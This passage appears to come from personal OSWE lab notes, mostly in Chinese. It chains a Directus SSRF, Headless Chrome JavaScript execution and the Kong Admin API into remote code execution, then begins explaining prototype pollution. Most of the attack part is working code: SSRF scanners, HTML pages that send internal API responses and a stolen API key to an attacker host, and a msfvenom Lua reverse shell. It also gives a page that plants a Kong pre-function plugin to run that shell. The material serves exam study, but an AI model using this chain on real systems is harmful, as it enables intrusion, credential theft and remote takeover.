    )
    parser.add_argument(
        "-p", "--ports",
        required=False,
        help="ports, e.g. 22,80,8000-8010"
    )
    parser.add_argument(
        "--timeout",
        default=5,
        type=float
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true"
    )
    parser.add_argument(
        "--show-all",
        action="store_true",
        help="show TIMEOUT / EHOSTUNREACH / closed results too"
    )

    args = parser.parse_args()

    ports = parse_ports(args.ports)
    hosts = parse_hosts(args.subnet, args.hosts)

    for host in hosts:
        print(f"Trying host: {host}")

        for port in ports:
            result = probe(args.target, host, port, args.timeout, args.verbose)

            if not args.show_all:
                if result in ["TIMEOUT", "EHOSTUNREACH", "ENETUNREACH", "DNS_FAIL"]:
                    continue

            print(f"\t{port}\t{result}")


if __name__ == "__main__":
    main()
```
執行掃描\
![image](https://hackmd.io/_uploads/SyKj_dxJGl.png)
![image](https://hackmd.io/_uploads/rkrn_dlkzx.png)
> 可以確保前六台可能是 live hosts，

Focus 前六台主機：
```
./ssrf_subnet_scanner.py  -t http://apigateway:8000/files/import --subnet 172.16.16 --hosts 1-6 --timeout 5
```
![image](https://hackmd.io/_uploads/BJbHtdgyfx.png)\
可以推測得知以下：
```
External
   ↓
172.16.16.1 : 8000 / 22
   ↓
172.16.16.2 : 8000 / 8001  Kong
   ↓
172.16.16.4 : 8055         Directus
   ↓
172.16.16.3 : 5432         PostgreSQL
   ↓
172.16.16.6 : 6379         Redis
   ↓
172.16.16.5 : 9000         Unknown HTTP service
```
![image](https://hackmd.io/_uploads/rkdptOeyfe.png)

#### - Extra Mile: 驗證 public endpoint 對應哪台 backend
可用 SSRF 直接打 Directus：
```
curl -i -X POST \
-H "Content-Type: application/json" \
-d '{"url":"http://172.16.16.4:8055/users"}' \
http://apigateway:8000/files/import
```
> 若回 "You don't have permission to access this."\
> 表示 Directus backend 上有 /users endpoint

或 
```
curl -i -X POST \
-H "Content-Type: application/json" \
-d '{"url":"http://172.16.16.4:8055/files"}' \
http://apigateway:8000/files/import
```

#### - Extra Mile: 測 Kong Admin API
```
curl -i -X POST \
-H "Content-Type: application/json" \
-d '{"url":"http://172.16.16.2:8001/"}' \
http://apigateway:8000/files/import
```
> 若回 "OPEN / permission / 404 / 200-related error"\
> 代表 SSRF 可以碰到 Kong Admin API

##  Render API Auth Bypass
前面初始 enumeration 發現 /render ，從外部透過 API Gateway 存取時會回 401\
代表 /render 被 Kong API Gateway 保護，需要 API key

若能透過 SSRF 直接打 backend，就可能繞過 Kong 的 API key 驗證
```
attacker
  ↓
Directus SSRF
  ↓
render backend service
```

上述 enum 中有找到 172.16.16.5:9000 Unknown HTTP service
先猜測為 render service ，測試是否存在 `http://172.16.16.3:9000/render`
```
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/render"}' http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/HJ30Rigkfl.png)
> Request failed with status code 404"
> > host:port 是活的，但 /render 不是正確 backend path

繼續 fuzz backend path，建立 path.txt
```
cat > paths.txt << 'EOF'
/
/render
/v1/render
/api/render
/api/v1/render
EOF
```
![image](https://hackmd.io/_uploads/SJ4JlngyGl.png)

建立腳本 ssrf_path_scanner.py 尋找其他 backend path
(透過 Directus SSRF 掃描 internal service 的 path，並根據 error message 判斷該 path 是否存在)

(完整 ssrf_path_scanner.py)
```python
#!/usr/bin/env python3

import argparse
import requests


def classify(text):
    if "You don't have permission to access this." in text:
        return "OPEN - returned permission error, therefore valid resource"

    if "Request failed with status code 404" in text:
        return "OPEN - returned 404"

    if "Request failed with status code 400" in text:
        return "OPEN - returned 400"

    if "Request failed with status code 401" in text:
        return "OPEN - returned 401"

    if "Request failed with status code 403" in text:
        return "OPEN - returned 403"

    if "ECONNREFUSED" in text:
        return "CLOSED"

    if "EHOSTUNREACH" in text:
        return "EHOSTUNREACH"

    if "ENETUNREACH" in text:
        return "ENETUNREACH"

    if "ENOTFOUND" in text:
        return "DNS_FAIL"

    if "ETIMEDOUT" in text or "timeout" in text.lower():
        return "TIMEOUT"

    if "Parse Error" in text or "HPE_" in text:
        return "OPEN - returned parse error, potentially non-http"

    if "socket hang up" in text:
        return "OPEN - socket hang up, likely non-http"

    return "UNKNOWN - " + text[:200].replace("\n", " ")


def request_via_ssrf(target, ssrf_base, path, timeout, verbose=False):
    ssrf_url = ssrf_base.rstrip("/") + path

    try:
        r = requests.post(
            url=target,
            json={"url": ssrf_url},
            timeout=timeout
        )

        if verbose:
            print(f"[DEBUG] SSRF URL: {ssrf_url}")
            print(f"[DEBUG] HTTP {r.status_code}")
            print(r.text[:500])

        return classify(r.text), r.text

    except requests.exceptions.Timeout:
        return "TIMEOUT", ""

    except requests.exceptions.RequestException as e:
        return f"ERROR - {e}", ""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="SSRF endpoint, e.g. http://apigateway:8000/files/import"
    )
    parser.add_argument(
        "-s", "--ssrf",
        required=True,
        help="internal service base URL, e.g. http://172.16.16.5:9000"
    )
    parser.add_argument(
        "-p", "--paths",
        required=True,
        help="path wordlist"
    )
    parser.add_argument(
        "--timeout",
        default=5,
        type=float
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true"
    )
    parser.add_argument(
        "--show-all",
        action="store_true"
    )

    args = parser.parse_args()

    with open(args.paths, "r") as f:
        for line in f:
            path = line.strip()

            if not path:
                continue

            if not path.startswith("/") and not path.startswith("?"):
                path = "/" + path

            result, raw = request_via_ssrf(
                target=args.target,
                ssrf_base=args.ssrf,
                path=path,
                timeout=args.timeout,
                verbose=args.verbose
            )

            if not args.show_all:
                if result in ["TIMEOUT", "CLOSED", "EHOSTUNREACH", "ENETUNREACH", "DNS_FAIL"]:
                    continue

            print(f"{path:30} {result}")


if __name__ == "__main__":
    main()
```
執行掃描
```
./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000 -p paths.txt --timeout 5
```
![image](https://hackmd.io/_uploads/r1lfz2x1Gg.png)
> `/api/render`: 400 
> 代表 /api/render 是有效 route 只是缺少必要參數或 payload 格式錯誤

猜測參數：\
🧠 服務為 render，可能作為 渲染頁面、產生圖片、產生 PDF、抓 URL 後用 Headless Browser render 等等\
常見參數: `url`, `target`, `file`, `input`, `data`\
建構 wordlist
```
cat > paths2.txt << 'EOF'
?data=foobar
?file=file:///etc/passwd
?url=http://KALI_IP/render/url
?input=foobar
?target=http://KALI_IP/render/target
EOF
```
![image](https://hackmd.io/_uploads/BkRSmhxyzg.png)


利用新 base URL 測參數: `http://172.16.16.5:9000/api/render`
```
./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000/api/render -p paths2.txt --timeout 5
```
![image](https://hackmd.io/_uploads/SkIK7nxyGe.png)

檢查 Apache log\
![image](https://hackmd.io/_uploads/S1PeU3gJGg.png)
> User-Agent: Mozilla/5.0 ... HeadlessChrome/79...\
> 可以得知 render service 啟動 Headless Chrome 去瀏覽 Kali URL

也因次攻擊練可延續到以下：
```
attacker
  ↓
POST /files/import
  ↓
Directus SSRF
  ↓
http://172.16.16.5:9000/api/render?url=http://KALI_IP/render/url
  ↓
Render service
  ↓
Headless Chrome
  ↓
GET http://KALI_IP/render/url
```
第一層 SSRF：Directus SSRF\
第二層 server-side browser request：Render service Headless Chrome fetch

>[!Note]
>為什麼這可能導向 RCE？\
>Headless Chrome / render service 常見弱點：
>1. Local file read via file://
>2. Internal service access
>3. PDF/HTML renderer bugs
>4. Chromium sandbox bypass
>5. XSS inside renderer
>6. SSRF-to-browser attack surface
>7. Access to metadata / localhost
>
>且 browser-like renderer 會：
> - 解析 HTML
> - 執行 JavaScript
> - 載入 external resources
> - 支援更多 scheme / parsing behavior

## Exploiting Headless Chrome
前面 Directus `/files/import` SSRF 的 User-Agent 是 `axios/0.21.1` 代表是 Node.js HTTP client\
現在透過 SSRF 打到 Render API 後，Render service 會使用 HeadlessChrome 載入指定 URL

Headless Chrome = 沒有 UI 的完整瀏覽器\
1. 載入 HTML
2. 解析 DOM
3. 執行 JavaScript
4. 發送 fetch / XHR
5. 載入圖片、CSS、iframe
6. 與內部服務互動

先在 kali apache 建立 hello.html，利用 Headless Chrome 存取\
驗證 JavaScript 是否會執行
![image](https://hackmd.io/_uploads/HygDcheJze.png)

透過 Headless Chrome 存取
```
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.206/hello.html"}' http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/ryQAq3gyfg.png)
> 403 代表 Directus SSRF → Render API → Headless Chrome 成功\
>只是最後 Directus import 權限不足

最後驗證 Apache log
![image](https://hackmd.io/_uploads/S1-li3ekze.png)
> JavaScript 成功在遠端 Headless Chrome 執行

![image](https://hackmd.io/_uploads/rkxVo2g1fx.png)

### Using JavaScript to Exfiltrate Dat
將先前的 Blind SSRF 轉成可讀 response 的 SSRF
🧠: 讓 Headless Chrome 執行 JavaScript，由 JavaScript 讀內部服務 response，再傳回 Kali

🎯 目標：Kong Admin API\
(前面掃描發現：`172.16.16.2:8001` 疑似 Kong Admin API，但外網不能直接存取)

建立 exfil.html
```html
<html>
<head>
<script>
function exfiltrate() {
    fetch("http://172.16.16.2:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://KALI_IP/callback?" + encodeURIComponent(data));
    })
    .catch((err) => {
        fetch("http://KALI_IP/error?" + encodeURIComponent(err));
    });
}
</script>
</head>
<body onload="exfiltrate()">
<div>Loading...</div>
</body>
</html>
```
![image](https://hackmd.io/_uploads/SkkXn2g1Me.png)

呼叫 Render API 觸發：
```
curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://KALI_IP/exfil.html"}' http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/ry8Ph3xyMx.png)

檢查 access.log\
![image](https://hackmd.io/_uploads/BJyjpng1Ml.png)
> %7B%22plugins%22... 是 URL-encoded JSON\
> ![image](https://hackmd.io/_uploads/SJ8Ap3lyGx.png)

JavaScript 成功從 Headless Chrome 連到 Kong Admin API、讀取 response body、把資料傳回 Kali

>[!Tip]
>當資料塞在 URL query: `/callback?...`\
>可能會遇到 "414 URI Too Long"\
>因此要切 chunks

更改完正 exfil.html
```html
<html>
<head>
<script>
const attacker = "http://KALI_IP";
const target = "http://172.16.16.2:8001";
const chunkSize = 900;

function sendChunk(id, index, total, chunk) {
    return fetch(
        attacker +
        "/callback?id=" + encodeURIComponent(id) +
        "&i=" + index +
        "&t=" + total +
        "&d=" + encodeURIComponent(chunk)
    );
}

function exfiltrate() {
    fetch(target)
    .then((response) => response.text())
    .then(async (data) => {
        let id = Date.now().toString();
        let total = Math.ceil(data.length / chunkSize);

        for (let i = 0; i < total; i++) {
            let chunk = data.slice(i * chunkSize, (i + 1) * chunkSize);
            await sendChunk(id, i, total, chunk);
        }
    })
    .catch((err) => {
        fetch(attacker + "/error?" + encodeURIComponent(err));
    });
}
</script>
</head>
<body onload="exfiltrate()">
<div>Loading...</div>
</body>
</html>
```
### Stealing Credentials from Kong Admin API
從 Kong Admin API 偷 API key = 控制整個 API Gateway\
在 Kong documentation 可以得知 endpoint /key-auths 可列出 API keys

將  exfil HTML payload 改成 `http://172.16.16.2:8001/key-auths`\
![image](https://hackmd.io/_uploads/B1IKkTl1Gx.png)

觸發 Render API\
![image](https://hackmd.io/_uploads/SyrpkTl1zg.png)

查看 Apache log:\
![image](https://hackmd.io/_uploads/ryw0kpekGx.png)\
![image](https://hackmd.io/_uploads/rk1flTgkGl.png)
```json
{
  "next": null,
  "data": [
    {
      "created_at": 1613767827,
      "id": "c34c38b6-4589-4a1e-a8f7-d2277f9fe405",
      "tags": null,
      "ttl": null,
      "key": "SBzrCb94o9JOWALBvDAZLnHo3s90smjC",
      "consumer": {
        "id": "a8c78b54-1d08-43f8-acd2-fb2c7be9e893"
      }
    }
  ]
}
```
> 成功取得 API key: `SBzrCb94o9JOWALBvDAZLnHo3s90smjC`

已拿到 Kong API key 代表不需要 Directus SSRF 了，可以直接正常打 API Gateway:\
嘗試直接呼叫 Render API
```
curl -i \
-H "apikey: SBzrCb94o9JOWALBvDAZLnHo3s90smjC" \
"http://apigateway:8000/render?url=http://192.168.45.206/test.html"
```
![image](https://hackmd.io/_uploads/HyNfbTlkGe.png)
> 200 驗證成功

## Remote Code Execution
完整串出攻擊鏈：
```
Blind SSRF
    ↓
Headless Chrome JS execution
    ↓
Internal Admin API access
    ↓
Kong Admin API key
    ↓
RCE
```
![image](https://hackmd.io/_uploads/B1VvfpeyGl.png)

完整 exploit：
```
External attacker
    ↓
Directus SSRF
    ↓
Render API
    ↓
Headless Chrome
    ↓
Kong Admin API
    ↓
Serverless pre-function plugin
    ↓
Lua execution
    ↓
Reverse shell
```
### RCE in Kong Admin API
在 Kong API Gateway document 中，[Serverless Functions](https://docs.konghq.com/hub/kong-inc/serverless-functions/) plugin 的文件中有一個警告:
> Warning ⚠️: The pre-function and post-function serverless plugin allows anyone who can enable the plugin to execute arbitrary code. If your organization has security concerns about this, disable the plugin in your kong.conf file.
>> 只要能新增 plugin 就能 RCE

Kong 本質是 Nginx + Lua，且 plugin 多允許 Lua execution\
其中 pre-function plugin 可以執行 Lua

🧠：利用 Headless Chrome JS execution 弱點，從 browser 對 Kong Admin API 發 POST

1. 使用 msfvenom 產生 reverse shell
```
msfvenom -p cmd/unix/reverse_lua lhost=192.168.45.206 lport=8888 -f raw -o shell.lua
```
![image](https://hackmd.io/_uploads/By5A7Te1fe.png)
> shell.lua
```
┌──(chw💲CHW)-[~/Offsec/OSWE/apigateway]
└─$ cat shell.lua                        
[2026-05-12 11:15:17] cat shell.lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.206',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" 
```
不會用到 `lua -e` 需要透過 HTML，因此建立一個 Service
2. 建立 Service
新建 rce.html
```html
<html>
<head>
<script>

function createService() {
    fetch("http://172.16.16.2:8001/services", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
    }).then(function (route) {
      createRoute();
    });
}

function createRoute() {
    fetch("http://172.16.16.2:8001/services/supersecret/routes", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"paths": ["/supersecret"]})
    }).then(function (plugin) {
      createPlugin();
    });  
}

function createPlugin() {
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[  REVERSE SHELL HERE ]}})
    }).then(function (callback) {
      fetch("http://KALI IP/callback?setupComplete");
    });  
}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>
```
![image](https://hackmd.io/_uploads/rJxDUaxyGe.png)
3. 開啟監聽 port
![image](https://hackmd.io/_uploads/SJAESagyMe.png)

4. 觸發 Render API: Headless Chrome 載入 rce.html
```
curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://KALI IP/rce.html"}' http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/Sy0oBaxyMe.png)
5. 查看 Apache log
![image](https://hackmd.io/_uploads/rkuF8ax1zx.png)
> 成功帶入 setupComplete 
6. 存取新的 service endpoint 觸發 Lua 有效 paylaod
![image](https://hackmd.io/_uploads/r1xiI6gyGe.png)
(Kali)
![image](https://hackmd.io/_uploads/rkk38pe1zg.png)

# Guacamole Lite Prototype Pollution
Prototype pollution 是指 JavaScript 的漏洞，攻擊者可以利用該漏洞向應用程式創建的每個 object 注入 properties\
[Olivier Arteau](https://www.youtube.com/watch?v=LUsiFV3dsK8) 在 2018 年 10 月的 NorthSec 上發表了利用 Prototype pollution 進行伺服器端攻擊的方法。

>[!Important]
>**Prototype 是什麼？**\
> JavaScript：`let a = {}` 不是單純 object\
> 👉🏻 繼承 Object.prototype
> Ex. 
> ```javascript
> let a = {}
> a.toString()
> ```
> 沒定義 `toString` 但還是能用\
> 因為是來自 prototype chain
> - Prototype Chain
> ```
> object
>  ↓
>Object.prototype
>  ↓
>null
> ```
> 所有 object 都共享 Object.prototype\
> 所以如果 `Object.prototype.hacked = "pwned"`\
> 那 `({}).hacked` 也會是 pwned
> - prototype pollution examples
> `if (obj.admin)` 只有真正 admin 才會有，但 `Object.prototype.admin = true`\
> 會造成 
> ```javascript
> let user = {}
> user.admin
> ```
> 也等於 true ，達到 Authentication bypass

環境範例創建了使用 [guacamole-lite](https://www.npmjs.com/package/guacamole-lite)（用於透過瀏覽器連接 RDP 用戶端的 Node 套件）和各種模板引擎的基本應用程式。 guacamole-lite 使用了一個在處理不受信任的使用者輸入時容易受到 Prototype pollution 攻擊的 library\
將利用 Prototype pollution 攻擊兩種不同的模板引擎，從而實現對目標系統的遠端程式碼執行 (RCE)

## Getting Started
利用 Burp proxy 連線 http://chips/ \
![image](https://hackmd.io/_uploads/HJkT8wb1fg.png)


點擊 Connect 會連線到遠端 RDP\
![image](https://hackmd.io/_uploads/ryoGNwZkzx.png)

觀察 Burp:
![image](https://hackmd.io/_uploads/B1PKVwbJMx.png)
- POST /tokens 取得 token
- GET /rdp?token \
![image](https://hackmd.io/_uploads/rJbPrw-Jfg.png)\
token 包含 `iv` 和 `value` 參數
- GET /guaclite?token
![image](https://hackmd.io/_uploads/Sy-6Hw-Jfl.png)
回應 101 用來啟動 WebSocket 連線

### Understanding the Code
因為 Prototype Pollution 不是單點漏洞\
是 runtime behavior corruption，需要理解整個 NodeJS app flow
才能知道哪裡能污染、哪裡有 gadget

使用 rsync 將程式碼載到 Kali
```
rsync -az --compress-level=1 student@chips:/home/student/chips/ chips/
```
![image](https://hackmd.io/_uploads/BJ_PKw-kfe.png)
```
code -a chips/
```
![image](https://hackmd.io/_uploads/By0z9w-yfg.png)
- app.js: 核心 Express app
- bin/www: HTTP server entrypoint
- routes/: Express endpoints
- frontend/: client-side JS
- views/: template engine
- node_modules/: 第三方 library

先看使用了哪些 package.json
```json
01  {
02    "name": "chips",
03    "version": "1.0.0",
04    "private": true,
05    "scripts": {
06      "start-dev": "node --inspect=0.0.0.0 ./bin/www",
07      "watch": "webpack watch --mode development",
08      "start": "webpack build --mode production && node ./bin/www",
09      "build": "webpack build --mode development"
10    },
11    "devDependencies": {
12      "@babel/core": "^7.13.1",
...
24      "webpack": "^5.24.2",
...
33    },
34    "dependencies": {
35      "cookie-parser": "~1.4.4",
36      "debug": "~2.6.9",
37      "dockerode": "^3.2.1",
38      "dotenv": "^8.2.0",
39      "ejs": "^3.1.6",
40      "express": "~4.16.1",
41      "guacamole-lite": "0.6.3",
42      "hbs": "^4.1.1",
43      "http-errors": "~1.6.3",
44      "morgan": "~1.9.1",
45      "pug": "^3.0.2"
46    }
47  }
```
> - `"start-dev": "node --inspect=0.0.0.0 ./bin/www"`: 透過./bin/www 檔啟動
> - `"start": "webpack build --mode production && node ./bin/www"`: 安裝了 Webpack， frontend
目錄很可能包含所有前端資源，包括啟動 WebSocket 連線的程式碼
> - `"express": "~4.16.1"`: 使用 Express Web 框架建立，routes 目錄可能包含端點定義

接著分析 `./bin/www` 了解應用程式如何啟動
```node
01  #!/usr/bin/env node
...
07  var app = require('../app');
08  var debug = require('debug')('app:server');
09  var http = require('http');
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
13
...
25  var server = http.createServer(app);
26
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
28
29  /**
30   * Listen on provided port, on all network interfaces.
31   */
32
33  server.listen(port);
34  server.on('error', onError);
35  server.on('listening', onListening);
...
```
> - `var app = require('../app');`: Express app loading
> - `new GuacamoleLite({server}, guacdOptions, clientOptions);`: guacamole-lite 直接 hook HTTP server，除了  Express route 還有 WebSocket endpoints
> app.js 被載入用於建立伺服器

接著看 app.js
```javascript
01  var createError = require('http-errors');
02  var express = require('express');
03  var path = require('path');
...
11
13  var app = express();
14
15  // view engine setup
16  t_engine = process.env.TEMPLATING_ENGINE;
17  if (t_engine !== "hbs" && t_engine !== "ejs" && t_engine !== "pug" )
18  {
19      t_engine = "hbs";
20  }
21
22 app.set('views', path.join(__dirname, 'views/' + t_engine));
23 app.set('view engine', t_engine);
...
30
31  app.use('/', indexRouter);
32  app.use('/token', tokenRouter);
33  app.use('/rdp', rdpRouter);
34 app.use('/files', filesRouter);
...
```
> - `t_engine = process.env.TEMPLATING_ENGINE;`: templating engine 允許 hbs, ejs, pug 切換 (環境範例只是為了示範不同 template gadget)
> - routes
> ```
> app.use('/token', tokenRouter);
> app.use('/rdp', rdpRouter);
> app.use('/files', filesRouter);
> ```
> routes 也能確認在 Burp 中看到的 endpoints

檢查 docker-compose.yml
```yaml
1	 version: '3'
2	 services:
3	   chips:
4	     build: .
5	     command: npm run start-dev
6	     restart: always
7	     environment:
8	       - TEMPLATING_ENGINE
9	     volumes:
10	      - .:/usr/src/app
11	      - /var/run/docker.sock:/var/run/docker.sock
12	    ports:
13	      - "80:3000"
14	      - "9229:9229"
15	      - "9228:9228"
16	  guacd:
17	    restart: always
18	    image: linuxserver/guacd
19	    container_name: guacd
20	
21	  rdesktop:
22	    restart: always
23	    image: linuxserver/rdesktop
24	    container_name: rdesktop
25      volumes:
26        - ./shared:/shared
27	    environment:
28	      - PUID=1000
29	      - PGID=1000
30	      - TZ=Europe/London
```
> - `command: npm run start-dev`: 開 debugger
> - `9229` port: Node inspect port
> - `/var/run/docker.sock:/var/run/docker.sock`: 直接控制 Docker daemon (container root ≈ host root)

SSH 登入嘗試切換模板
![image](https://hackmd.io/_uploads/BJOhQoZ1Mx.png)

指示 app.js 使用 EJS templating engine 啟動
```
TEMPLATING_ENGINE=ejs docker-compose up
```
![image](https://hackmd.io/_uploads/SkSgVo-yMe.png)
> 切換 template engine

驗證新的 template
```
curl http://chips -s | grep "<\!--"
```
![image](https://hackmd.io/_uploads/HybFhjZJMx.png)

### Configuring Remote Debugging
把 VS Code debugger 接到遠端 Chips NodeJS process\
分析 prototype pollution、template engine gadget 時，可以
1. 下 breakpoint
2. inspect object / prototype chain
3. 單步執行 library function
4. 直接在 Node CLI 測污染效果

透過 Remote Debugging 可以檢查 Object.prototype 是否被污染、污染後哪個 function 讀到該 property、template engine 如何 compile\
Chips source code 中提供了一個 `.vscode/launch.json` ，可以用它來快速設定調試。需要更新 address fields 指向遠端伺服器
```json
{

	"version": "0.2.0",
	"configurations": [
		{
			"type": "node",
			"request": "attach",
			"name": "Attach to remote",
			"address": "chips",
			"port": 9229,
			"localRoot": "${workspaceFolder}",
			"remoteRoot": "/usr/src/app"
		},
		{
			"type": "node",
			"request": "attach",
			"name": "Attach to remote (cli)",
			"address": "chips",
			"port": 9228,
			"localRoot": "${workspaceFolder}",
			"remoteRoot": "/usr/src/app"
		}
	]
}
```
> - `"localRoot": "${workspaceFolder}"`: Kali 上的本機 source code 目錄\
> - `"remoteRoot": "/usr/src/app"`: 代表 container 內的 app path


已配置兩個 remote debugging profiles configured。第一個設定檔使用 9229 port。應用程式已使用 package.json 中的 start-dev 腳本啟動，該腳本會在 9229 連接埠啟動 Node.js\
為了驗證其是否正常運作，需要在 Visual Studio Code 中至「Run and Debug 」標籤並啟動該設定檔\
![image](https://hackmd.io/_uploads/SkBsb3Z1fl.png)

接下來嘗試透過 CLI 連線 Debug Node CLI
後續可用 Node CLI 測 `Object.prototype`, `merge function`, `EJS / Pug behavior`。因此要開一個互動式 Node shell，且允許 debugger attach

利用 docker-compose 在 chips container（如docker-compose.yml中定義）上執行一個指令 `node --inspect=0.0.0.0:9228`
，目的是啟動一個互動式 shell，同時開啟 9228 連接埠進行 remote debugging
```
docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
```

![image](https://hackmd.io/_uploads/S1OnS3-1Me.png)

建立兩條 debug path:
```
9229 → web application
9228 → interactive Node CLI
```
後面分析 prototype pollution 時:
- Web debugger: 看真實 request flow
- CLI debugger: 快速測 library behavior 與 template gadget

## Introduction to JavaScript Prototype
Prototype Pollution 的核心理論
>[!Note]
>JavaScript 幾乎全部都是 Object:
>```javascript
>{}
>[]
>function(){}
>class A {}
>new Date()
>```
>只有 `null`, `undefined`, `string`, `number`, `boolean`, `symbol` 不是

JavaScript 不是真正的 Class-based OOP\
Java `class Car {}` 是真正 class blueprint\
但 JavaScript `class Student {}` 其實只是 constructor function 的語法糖 （Syntactic Sugar）

>[!Tip]
>ES2015 class 本質:
>```javascript
>class Student {
>    constructor() {
>        this.id = 1;
>    }
>}
>```
>等價於：
>```javascript
>function Student() {
>    this.id = 1;
>}
>```
>所以 `typeof Student` 結果會是 `'function'`

當 new Student() (`s = new Student()`) 實際流程：
- Step 1
建立空 object： `{}`
- Step 2
設定 `s.__proto__ = Student.prototype`
- Step 3
執行 constructor：`this.id = 1`，此時 `this === s`
- Step 4
return s

>[!Important]
>**prototype vs proto**
>- prototype
>`Student.prototype` 是 constructor function 的屬性
>- proto
>`s.__proto__` 是 object 的 prototype link
>
>關係圖：
>```
>Student (function)
>   |
>   | prototype
>   v
>Student.prototype
>   ^
>   |
>   | __proto__
>   |
>s object
>```
> Prototype Chain:
> ```
> s
> ↓
>Student.prototype
> ↓
>Object.prototype
> ↓
>null
> ```

![image](https://hackmd.io/_uploads/rJEUfpb1Mg.png)
1. Object.toString()
因為 Object 本身是 function object，這是 `Function.prototype.toString()` 不是 `Object.prototype.toString()`
2. (new Object).toString()
因為 `new Object()` 建立的是 object instance，會走 `Object.prototype.toString`
3. (new Function).toString()
因為 Function object 會先使用 `Function.prototype.toString`
4. {}.__proto__.toString = "breaking toString"
等價於 `Object.prototype.toString = "breaking toString"`
5. (new Object).toString()
TypeError 炸掉，toString 已不是 function 變成 breaking toString
6.  (new Function).toString() 為什麼 Function 沒壞？
```
Function instance
 ↓
Function.prototype
 ↓
Object.prototype
```
Function.prototype 本身已有 toString ，所以 `(new Function).toString()` 會先命中 `Function.prototype.toString` 不會走到 `Object.prototype.toString`

### Prototype Pollution
如何從 user-controlled object 污染到 Object.prototype

Prototype Pollution 最常見來源：
```
merge
extend
clone
deep copy
defaults
config merge
```
這些 function 會 recursively traverse object

merge 的正常用途:
```
> function merge(a,b) {
... for (var key in b){
..... if (isObject(a[key]) && isObject(b[key])) {
....... merge(a[key], b[key])
....... }else {
....... a[key] = b[key];
....... }
..... }
... return a
... }
undefined
> x = {"hello": "world"}
{ hello: 'world' }
> y = {"foo" :{"bar": "foobar"}}
{ foo: { bar: 'foobar' } }
> y = {"foo" :{"bar": "foobar"}}
{ foo: { bar: 'foobar' } }
> merge(x,y)
{ hello: 'world', foo: { bar: 'foobar' } }
> 
```

當把第二個 object 中的 `__proto__` key 設定為另一個 object 時，事情就變得有趣 🤹\
![image](https://hackmd.io/_uploads/HJTR72zJze.png)\
執行 merge function 時會遍歷 y 物件中的所有 keys。該物件中唯一的 key 是 `__proto__`\
由於 `x["__proto__"]`是指向 parent object prototype 的連結，所以一定是一個物件\
而 `y["__proto__"]` 也是一個物件（因為我們有賦值為 1）\
⚠️ 所以 if 語句的結果為 true 代表 merge function 會使用`x["__proto__"]` 和 `y["__proto__"]` 作為參數被呼叫

當 merge function 再次運作，for 迴圈會列舉 `y["__proto__"]` 的key:
- `y ["__proto__"]` 的唯一屬性是 "bar"
- `x["__proto__"]` 中不存在此屬性，因此 if 為 false，並執行 else: 將 `x ["__proto__"]["bar"]` 的值設為 `y["__proto__"]["bar"]`的值（或 "foobar"）。

🧠：由於 `x["__proto__"]` 指向 Object class prototype，合併操作會導致所有物件都被污染\
以下檢查新建立物件中 bar 的值來驗證:
```
> {}.bar
'foobar'
```
>[!Important]
>Prototype Pollution 的必要條件:
>1. recursive merge: deep merge
>2. 支援 object merge: `isObject(a[key])`
>3. 可控 key (`__proto__`, `constructor`, `prototype`)
>> - Array 也受影響 (Array 也是 object)\
>> `Array` > `Array.prototype` > `Object.prototype`\
>> 但 length 不受影響
>> - 傳統 for loop 不受影響 (`for(i=0;i<[1,2].length;i++)`)
>> - forEach 也不受影響 (forEach 使用 array.length)

### Blackbox Discovery
在不知道 source code 的情況下，如何測 Prototype Pollution\
⚠️ Prototype Pollution 測試很容易造成 DoS\
一旦污染成功 Object.prototype 被改掉，會持續影響到 Node process restart

Blackbox HTTP request 通常只能送 JSON, form data, query string, path parameter 等等\
通常不能直接送 JavaScript object\
因此實際流程會是：
```
HTTP JSON body
    ↓
body-parser / express.json()
    ↓
JavaScript object
    ↓
merge / extend / assign
    ↓
prototype pollution
```
常見污染 payload:
```json
{
  "__proto__": {
    "polluted": "yes"
  }
}
```
更深層:
```json
{
  "constructor": {
    "prototype": {
      "polluted": "yes"
    }
  }
}
```
黑箱狀態下，不知道 app 哪裡會讀 polluted\
👉🏻 要污染一個很多 library 都會用的 built-in property\
最常見目標：**"toString"**

破壞型 payload:
```json
{
  "__proto__": {
    "toString": "breaking toString"
  }
}
```
若成功污染 `Object.prototype.toString = "breaking toString"`\
程式呼叫 `Object.prototype.toString.call(input)` 會造成 TypeError: Object.prototype.toString.call is not a function

[環境範例]\
回到 Burp 觀察 POST /token，嘗試在 JSON body 中注入 payload
![image](https://hackmd.io/_uploads/rkntSbmkfx.png)\
![image](https://hackmd.io/_uploads/rka1LWQJfe.png)
```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": ""
    },
